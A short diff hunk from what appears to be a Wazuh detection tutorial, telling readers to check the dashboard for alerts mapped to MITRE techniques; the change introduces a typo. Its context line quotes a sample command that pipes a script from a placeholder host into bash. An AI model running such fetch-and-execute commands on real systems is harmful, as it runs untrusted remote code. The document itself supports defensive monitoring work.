@@ -69,6 +69,6 @@ curl http://example.com/malware.sh | bash
     - Login into wazuh dashboard 
     - under agent -> Security events, you will find all the above commands alerts mapped to rule_id, mitre attack TTPs and other details.
 
-    - Reference Image:
+    - Refernce Image:
         - [auditd events](../images/auditd%20evetns.png)
         
